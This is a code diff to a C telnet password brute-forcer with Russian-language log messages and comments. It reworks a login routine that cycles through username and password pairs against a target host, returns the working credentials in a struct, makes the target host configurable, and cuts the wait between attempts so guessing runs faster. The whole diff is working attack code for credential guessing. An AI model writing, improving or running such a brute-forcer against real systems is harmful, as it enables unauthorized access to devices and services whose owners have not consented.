@@ -3,8 +3,8 @@
 #include "bruteforce_functions/socket_things.c"
 #include "bruteforce_functions/login_things.c"
 
-char* telnet_login(const char *host) {
-    static char result[256];
+Credentials telnet_login(const char *host) {
+    static Credentials result;
     char buffer[TELNET_MAX_BUFFER];
     int sock;
     struct sockaddr_in server;
@@ -37,13 +37,17 @@ char* telnet_login(const char *host) {
             }
 
             printf("Пытаемся войти с паролем %s\n", *password);
-            sleep(2);
+            sleep(0.5);
             send_password(sock, *password);
 
             printf("Подождали. Проверяем успешность входа\n");
-            sleep(5);
+            sleep(1);
             if (check_login_success(sock, buffer)) {
-                snprintf(result, sizeof(result), "%s:%s", *username, *password);
+                strncpy(result.username, *username, sizeof(result.username) - 1);
+                strncpy(result.password, *password, sizeof(result.password) - 1);
+                result.username[sizeof(result.username) - 1] = '\0'; // Обеспечиваем нуль-терминацию
+                result.password[sizeof(result.password) - 1] = '\0'; // Обеспечиваем нуль-терминацию
+                result.good = 1;
                 close_socket(sock, "");
                 return result;
             }
@@ -53,17 +57,21 @@ char* telnet_login(const char *host) {
         }
     }
 
-    return "";
+    // Если вход не удался, возвращаем пустые строки
+    result.username[0] = '\0';
+    result.password[0] = '\0';
+    result.good = 0;
+    return result;
 }
 
-int telnet_brute() {
-    char *credentials = telnet_login(TELNET_HOST);
+Credentials telnet_brute(char *host) {
+    Credentials credentials = telnet_login(host);
     
-    if (strlen(credentials) > 0) {
-        printf("Успешный вход: %s\n", credentials);
+    if (credentials.username[0] != '\0' && credentials.password[0] != '\0') {
+        printf("Успешный вход: %s:%s\n", credentials.username, credentials.password);
     } else {
-        printf("Не удалось войти на %s\n", TELNET_HOST);
+        printf("Не удалось войти на %s\n", host);
     }
 
-    return 0;
+    return credentials;
 }
